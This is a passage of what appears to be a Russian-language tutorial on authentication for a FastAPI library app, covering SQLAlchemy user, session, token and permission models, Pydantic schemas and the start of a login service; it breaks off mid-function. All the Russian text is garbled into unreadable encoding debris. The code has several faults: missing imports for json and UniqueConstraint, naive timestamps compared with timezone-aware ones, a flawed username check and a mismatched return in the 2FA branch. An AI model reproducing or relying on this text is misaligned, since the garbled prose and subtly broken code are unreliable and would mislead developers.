- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∞–≤–∞–º–∏ –¥–æ—Å—Ç—É–ø–∞
- –ê—É–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

**–ü—Ä–∏–Ω—Ü–∏–ø—ã –ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:**
- –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø–æ–ª—è
- –ò–Ω–¥–µ–∫—Å—ã –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –ø–æ–∏—Å–∫–∞
- –ú—è–≥–∫–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ –¥–ª—è –∞—É–¥–∏—Ç–∞
- –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π (created_at, updated_at)

```python
# app/models/user.py (—Ä–∞—Å—à–∏—Ä—è–µ–º)
from sqlalchemy import Column, Integer, String, Boolean, DateTime, Enum, ForeignKey, Index
from sqlalchemy.orm import relationship
from sqlalchemy.dialects.postgresql import UUID
from datetime import datetime, timedelta, timezone
import enum

class UserRole(str, enum.Enum):
    """–†–æ–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    SUPER_ADMIN = "super_admin"
    ADMIN = "admin"
    LIBRARIAN = "librarian"
    READER = "reader"
    GUEST = "guest"

class UserStatus(str, enum.Enum):
    """–°—Ç–∞—Ç—É—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    ACTIVE = "active"
    INACTIVE = "inactive"
    SUSPENDED = "suspended"
    BANNED = "banned"

class User(Base):
    """–ú–æ–¥–µ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –ø–æ–ª–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
    
    __tablename__ = "users"
    
    # –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
    id = Column(Integer, primary_key=True, index=True)
    email = Column(String(255), unique=True, index=True, nullable=False)
    username = Column(String(100), unique=True, index=True, nullable=False)
    hashed_password = Column(String(255), nullable=False)
    full_name = Column(String(200))
    
    # –†–æ–ª—å –∏ —Å—Ç–∞—Ç—É—Å
    role = Column(Enum(UserRole), default=UserRole.READER, nullable=False)
    status = Column(Enum(UserStatus), default=UserStatus.ACTIVE, nullable=False)
    
    # –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ email
    is_email_verified = Column(Boolean, default=False, nullable=False)
    email_verified_at = Column(DateTime, nullable=True)
    email_verification_token = Column(String(255), nullable=True)
    email_verification_sent_at = Column(DateTime, nullable=True)
    
    # –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
    failed_login_attempts = Column(Integer, default=0, nullable=False)
    last_failed_login = Column(DateTime, nullable=True)
    locked_until = Column(DateTime, nullable=True)
    last_password_change = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)
    password_reset_token = Column(String(255), nullable=True)
    password_reset_sent_at = Column(DateTime, nullable=True)
    
    # –î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
    two_factor_enabled = Column(Boolean, default=False, nullable=False)
    two_factor_secret = Column(String(255), nullable=True)
    two_factor_backup_codes = Column(String(1000), nullable=True)  # JSON —Å–ø–∏—Å–æ–∫
    
    # –°–µ—Å—Å–∏–∏ –∏ —Ç–æ–∫–µ–Ω—ã
    last_login = Column(DateTime, nullable=True)
    last_login_ip = Column(String(45), nullable=True)  # IPv4 –∏–ª–∏ IPv6
    current_login_ip = Column(String(45), nullable=True)
    
    # API –¥–æ—Å—Ç—É–ø
    api_key = Column(String(100), unique=True, nullable=True)
    api_key_enabled = Column(Boolean, default=False, nullable=False)
    api_key_last_used = Column(DateTime, nullable=True)
    
    # –ú–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ
    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)
    updated_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))
    deleted_at = Column(DateTime, nullable=True)
    
    # –û—Ç–Ω–æ—à–µ–Ω–∏—è
    sessions = relationship("UserSession", back_populates="user", cascade="all, delete-orphan")
    api_tokens = relationship("APIToken", back_populates="user", cascade="all, delete-orphan")
    permissions = relationship("UserPermission", back_populates="user", cascade="all, delete-orphan")
    
    # –ò–Ω–¥–µ–∫—Å—ã
    __table_args__ = (
        Index('idx_user_status_role', 'status', 'role'),
        Index('idx_user_email_verified', 'email', 'is_email_verified'),
    )
    
    def is_active(self) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞, –∞–∫—Ç–∏–≤–µ–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"""
        return self.status == UserStatus.ACTIVE and self.deleted_at is None
    
    def is_locked(self) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞, –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"""
        if self.locked_until:
            return datetime.now(timezone.utc) < self.locked_until
        return False
    
    def can_login(self) -> bool:
        """–ú–æ–∂–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–æ–π—Ç–∏"""
        return self.is_active() and not self.is_locked()
    
    def record_failed_login(self, ip_address: str):
        """–ó–∞–ø–∏—Å—å –Ω–µ—É–¥–∞—á–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞"""
        self.failed_login_attempts += 1
        self.last_failed_login = datetime.now(timezone.utc)
        
        # –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ—Å–ª–µ 5 –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
        if self.failed_login_attempts >= 5:
            self.locked_until = datetime.now(timezone.utc) + timedelta(minutes=15)
    
    def reset_failed_logins(self):
        """–°–±—Ä–æ—Å —Å—á–µ—Ç—á–∏–∫–∞ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫"""
        self.failed_login_attempts = 0
        self.last_failed_login = None
        self.locked_until = None
    
    def record_successful_login(self, ip_address: str):
        """–ó–∞–ø–∏—Å—å —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞"""
        self.reset_failed_logins()
        self.last_login = datetime.now(timezone.utc)
        self.last_login_ip = self.current_login_ip
        self.current_login_ip = ip_address

# app/models/session.py
class UserSession(Base):
    """–ú–æ–¥–µ–ª—å —Å–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏"""
    
    __tablename__ = "user_sessions"
    
    id = Column(Integer, primary_key=True, index=True)
    session_token = Column(String(500), unique=True, nullable=False, index=True)
    user_agent = Column(String(500))
    ip_address = Column(String(45))
    expires_at = Column(DateTime, nullable=False)
    last_activity = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)
    is_active = Column(Boolean, default=True, nullable=False)
    
    # –í–Ω–µ—à–Ω–∏–µ –∫–ª—é—á–∏
    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)
    
    # –û—Ç–Ω–æ—à–µ–Ω–∏—è
    user = relationship("User", back_populates="sessions")
    
    def is_expired(self) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –∏—Å—Ç–µ—á–µ–Ω–∏—è —Å—Ä–æ–∫–∞ –¥–µ–π—Å—Ç–≤–∏—è —Å–µ—Å—Å–∏–∏"""
        return datetime.now(timezone.utc) > self.expires_at

# app/models/api_token.py
class APIToken(Base):
    """–ú–æ–¥–µ–ª—å API —Ç–æ–∫–µ–Ω–∞ –¥–ª—è machine-to-machine –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    
    __tablename__ = "api_tokens"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), nullable=False)
    token = Column(String(100), unique=True, nullable=False, index=True)
    scopes = Column(String(1000))  # JSON —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π
    last_used = Column(DateTime, nullable=True)
    expires_at = Column(DateTime, nullable=True)
    is_active = Column(Boolean, default=True, nullable=False)
    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)
    
    # –í–Ω–µ—à–Ω–∏–µ –∫–ª—é—á–∏
    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)
    
    # –û—Ç–Ω–æ—à–µ–Ω–∏—è
    user = relationship("User", back_populates="api_tokens")
    
    def has_scope(self, scope: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è scope —É —Ç–æ–∫–µ–Ω–∞"""
        if not self.scopes:
            return False
        scopes_list = json.loads(self.scopes)
        return scope in scopes_list
    
    def is_expired(self) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –∏—Å—Ç–µ—á–µ–Ω–∏—è —Å—Ä–æ–∫–∞ –¥–µ–π—Å—Ç–≤–∏—è —Ç–æ–∫–µ–Ω–∞"""
        if self.expires_at:
            return datetime.now(timezone.utc) > self.expires_at
        return False

# app/models/permission.py
class Permission(Base):
    """–ú–æ–¥–µ–ª—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è"""
    
    __tablename__ = "permissions"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), unique=True, nullable=False)
    description = Column(String(500))
    resource = Column(String(100), nullable=False)  # books, users, etc.
    action = Column(String(50), nullable=False)     # create, read, update, delete
    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc), nullable=False)

class UserPermission(Base):
    """–°–≤—è–∑—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å-—Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ"""
    
    __tablename__ = "user_permissions"
    
    id = Column(Integer, primary_key=True, index=True)
    
    # –í–Ω–µ—à–Ω–∏–µ –∫–ª—é—á–∏
    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)
    permission_id = Column(Integer, ForeignKey('permissions.id'), nullable=False)
    
    # –û—Ç–Ω–æ—à–µ–Ω–∏—è
    user = relationship("User", back_populates="permissions")
    permission = relationship("Permission")
    
    # –£–Ω–∏–∫–∞–ª—å–Ω–∞—è —Å–≤—è–∑—å
    __table_args__ = (UniqueConstraint('user_id', 'permission_id', name='unique_user_permission'),)
```

### **4. Pydantic –º–æ–¥–µ–ª–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (–∫–∞—Ç–∞–ª–æ–≥ schemas/)**

**–ó–∞—á–µ–º –Ω—É–∂–Ω—ã Pydantic –º–æ–¥–µ–ª–∏:**
- –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
- –°–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏—è –æ—Ç–≤–µ—Ç–æ–≤
- –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è API (OpenAPI)
- –¢–∏–ø–æ–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å

**–ü—Ä–∏–Ω—Ü–∏–ø—ã:**
- –°—Ç—Ä–æ–≥–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –Ω–∞ –≤—Ö–æ–¥–µ
- –†–∞–∑–Ω—ã–µ –º–æ–¥–µ–ª–∏ –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –∏ –æ—Ç–≤–µ—Ç–∞
- –í–∞–ª–∏–¥–∞—Ç–æ—Ä—ã –¥–ª—è –±–∏–∑–Ω–µ—Å-–ø—Ä–∞–≤–∏–ª
- –ß–µ—Ç–∫–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö

```python
# app/schemas/auth.py
from pydantic import BaseModel, Field, EmailStr, field_validator, model_validator, ConfigDict
from typing import Optional, List
from datetime import datetime, timezone

class Token(BaseModel):
    """–°—Ö–µ–º–∞ JWT —Ç–æ–∫–µ–Ω–æ–≤"""
    access_token: str
    refresh_token: str
    token_type: str = "bearer"
    expires_in: int

class TokenData(BaseModel):
    """–î–∞–Ω–Ω—ã–µ –∏–∑ JWT —Ç–æ–∫–µ–Ω–∞"""
    user_id: Optional[int] = None
    username: Optional[str] = None
    role: Optional[str] = None
    scopes: List[str] = []

class UserLogin(BaseModel):
    """–°—Ö–µ–º–∞ –¥–ª—è –≤—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    username: str = Field(..., min_length=3, max_length=100)
    password: str = Field(..., min_length=8, max_length=100)
    remember_me: bool = False
    
    @field_validator('username')
    @classmethod
    def username_validator(cls, v):
        """–í–∞–ª–∏–¥–∞—Ü–∏—è –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        if ' ' in v:
            raise ValueError('–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –ø—Ä–æ–±–µ–ª–æ–≤')
        if not v.isalnum() and '_' not in v:
            raise ValueError('–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã, —Ü–∏—Ñ—Ä—ã –∏ –ø–æ–¥—á–µ—Ä–∫–∏–≤–∞–Ω–∏—è')
        return v

class UserRegister(BaseModel):
    """–°—Ö–µ–º–∞ –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    email: EmailStr
    username: str = Field(..., min_length=3, max_length=100)
    password: str = Field(..., min_length=8, max_length=100)
    password_confirm: str = Field(..., min_length=8, max_length=100)
    full_name: Optional[str] = Field(None, max_length=200)
    
    @field_validator('username')
    @classmethod
    def username_validator(cls, v):
        if ' ' in v:
            raise ValueError('–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –ø—Ä–æ–±–µ–ª–æ–≤')
        return v
    
    @model_validator(mode='after')
    def passwords_match(self):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π"""
        if self.password != self.password_confirm:
            raise ValueError('–ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç')
        return self
    
    @field_validator('password')
    @classmethod
    def password_strength(cls, v):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –ø–∞—Ä–æ–ª—è"""
        errors = []
        if not any(c.isupper() for c in v):
            errors.append('–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–Ω—É –∑–∞–≥–ª–∞–≤–Ω—É—é –±—É–∫–≤—É')
        if not any(c.islower() for c in v):
            errors.append('–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–Ω—É —Å—Ç—Ä–æ—á–Ω—É—é –±—É–∫–≤—É')
        if not any(c.isdigit() for c in v):
            errors.append('–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–Ω—É —Ü–∏—Ñ—Ä—É')
        if len(v) < 8:
            errors.append('–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–µ –º–µ–Ω–µ–µ 8 —Å–∏–º–≤–æ–ª–æ–≤')
        
        if errors:
            raise ValueError('; '.join(errors))
        return v

class PasswordResetRequest(BaseModel):
    """–ó–∞–ø—Ä–æ—Å –Ω–∞ —Å–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è"""
    email: EmailStr

class PasswordResetConfirm(BaseModel):
    """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–±—Ä–æ—Å–∞ –ø–∞—Ä–æ–ª—è"""
    token: str
    new_password: str = Field(..., min_length=8, max_length=100)
    new_password_confirm: str = Field(..., min_length=8, max_length=100)
    
    @model_validator(mode='after')
    def passwords_match(self):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π"""
        if self.new_password != self.new_password_confirm:
            raise ValueError('–ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç')
        return self

class ChangePassword(BaseModel):
    """–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è"""
    current_password: str
    new_password: str = Field(..., min_length=8, max_length=100)
    new_password_confirm: str = Field(..., min_length=8, max_length=100)
    
    @model_validator(mode='after')
    def validate_passwords(self):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è –∏ —Ä–∞–∑–ª–∏—á–∏—è –ø–∞—Ä–æ–ª–µ–π"""
        if self.new_password != self.new_password_confirm:
            raise ValueError('–ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç')
        if self.new_password == self.current_password:
            raise ValueError('–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –æ—Ç —Ç–µ–∫—É—â–µ–≥–æ')
        return self

class TwoFactorSetup(BaseModel):
    """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    password: str

class TwoFactorVerify(BaseModel):
    """–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    code: str = Field(..., min_length=6, max_length=6)

class APITokenCreate(BaseModel):
    """–°–æ–∑–¥–∞–Ω–∏–µ API —Ç–æ–∫–µ–Ω–∞"""
    name: str = Field(..., min_length=3, max_length=100)
    scopes: List[str] = Field(default=["read"])
    expires_in_days: Optional[int] = Field(None, ge=1, le=365)

class APITokenResponse(BaseModel):
    """–û—Ç–≤–µ—Ç —Å API —Ç–æ–∫–µ–Ω–æ–º"""
    id: int
    name: str
    token: str  # –¢–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏
    scopes: List[str]
    expires_at: Optional[datetime]
    created_at: datetime
    last_used: Optional[datetime]
    
    model_config = ConfigDict(from_attributes=True)
```

### **5. –°–µ—Ä–≤–∏—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**

**–ó–∞—á–µ–º –Ω—É–∂–µ–Ω —Å–µ—Ä–≤–∏—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:**
- –ò–Ω–∫–∞–ø—Å—É–ª—è—Ü–∏—è –±–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
- –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞
- –õ–µ–≥–∫–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ
- –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫

**–ü—Ä–∏–Ω—Ü–∏–ø—ã:**
- –û–¥–∏–Ω —Å–µ—Ä–≤–∏—Å –¥–ª—è –≤—Å–µ—Ö –æ–ø–µ—Ä–∞—Ü–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
- –ß–µ—Ç–∫–æ–µ —Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏
- –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Å–µ—Ö –≤–æ–∑–º–æ–∂–Ω—ã—Ö –æ—à–∏–±–æ–∫
- –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∞–∂–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π

```python
# app/services/auth_service.py
import logging
from typing import Optional, Dict, Any, Tuple
from datetime import datetime, timedelta, timezone
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update, and_, or_

from app.models.user import User, UserStatus, UserRole
from app.models.session import UserSession
from app.models.api_token import APIToken
from app.core.security import (
    verify_password, get_password_hash,
    create_access_token, create_refresh_token,
    verify_token, create_password_reset_token,
    verify_password_reset_token, generate_api_key
)
from app.core.exceptions import (
    UnauthorizedException, ForbiddenException,
    ValidationException, NotFoundException,
    ConflictException
)
from app.schemas.auth import (
    UserLogin, UserRegister, Token,
    PasswordResetRequest, PasswordResetConfirm,
    ChangePassword, TwoFactorSetup, TwoFactorVerify,
    APITokenCreate
)
import pyotp
import qrcode
import io
import base64
import json

logger = logging.getLogger(__name__)

class AuthService:
    """–°–µ—Ä–≤–∏—Å –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π"""
    
    def __init__(self, db: AsyncSession):
        self.db = db
    
    # ===== –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø –ò –í–•–û–î =====
    
    async def register(self, user_data: UserRegister) -> User:
        """–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç–∏ email
        email_query = select(User).where(User.email == user_data.email)
        email_result = await self.db.execute(email_query)
        if email_result.scalar_one_or_none():
            raise ConflictException(
                detail="–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º email —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç",
                resource="user",
                conflicting_field="email",
                conflicting_value=user_data.email
            )
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç–∏ username
        username_query = select(User).where(User.username == user_data.username)
        username_result = await self.db.execute(username_query)
        if username_result.scalar_one_or_none():
            raise ConflictException(
                detail="–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º –∏–º–µ–Ω–µ–º —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç",
                resource="user",
                conflicting_field="username",
                conflicting_value=user_data.username
            )
        
        # –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        hashed_password = get_password_hash(user_data.password)
        
        user = User(
            email=user_data.email,
            username=user_data.username,
            hashed_password=hashed_password,
            full_name=user_data.full_name,
            role=UserRole.READER,
            status=UserStatus.ACTIVE
        )
        
        self.db.add(user)
        await self.db.commit()
        await self.db.refresh(user)
        
        logger.info(f"User registered: {user.id} - {user.email}")
        
        # –û—Ç–ø—Ä–∞–≤–∫–∞ email –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
        # –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –í production –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —Ç–∏–ø–∞ 
        # fastapi-mail, sendgrid –∏–ª–∏ AWS SES –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ email
        # if not settings.DEBUG:
        #     await send_verification_email(user.email, verification_token)
        
        return user
    
    async def login(
        self, 
        login_data: UserLogin, 
        user_agent: str, 
        ip_address: str
    ) -> Tuple[User, Token]:
        """–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        # –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ username –∏–ª–∏ email
        user_query = select(User).where(
            or_(
                User.username == login_data.username,
                User.email == login_data.username
            )
        )
        
        result = await self.db.execute(user_query)
        user = result.scalar_one_or_none()
        
        if not user:
            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –Ω–µ—É–¥–∞—á–Ω—É—é –ø–æ–ø—ã—Ç–∫—É –¥–ª—è –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            # —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –ø–µ—Ä–µ–±–æ—Ä –ø–æ –∏–º–µ–Ω–∞–º
            await self._record_failed_attempt(None, ip_address)
            raise UnauthorizedException(detail="–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
        if user.is_locked():
            raise UnauthorizedException(
                detail="–ê–∫–∫–∞—É–Ω—Ç –≤—Ä–µ–º–µ–Ω–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ."
            )
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞
        if not user.is_active():
            raise UnauthorizedException(detail="–ê–∫–∫–∞—É–Ω—Ç –Ω–µ–∞–∫—Ç–∏–≤–µ–Ω")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
        if not verify_password(login_data.password, user.hashed_password):
            await self._record_failed_attempt(user, ip_address)
            raise UnauthorizedException(detail="–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
        if user.two_factor_enabled:
            # –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω –¥–ª—è 2FA
            return await self._create_2fa_token(user, user_agent, ip_address)
        
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω–æ–≤
        tokens = await self._create_tokens(user, login_data.remember_me)
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        user.record_successful_login(ip_address)
        
        # –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏
        await self._create_session(user, tokens["refresh_token"], user_agent, ip_address)
        
        await self.db.commit()
        
        logger.info(f"User logged in: {user.id} - {user.email}")
        
        return user, tokens
    
    async def _record_failed_attempt(self, user: Optional[User], ip_address: str):
        """–ó–∞–ø–∏—Å—å –Ω–µ—É–¥–∞—á–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞"""
        if user:
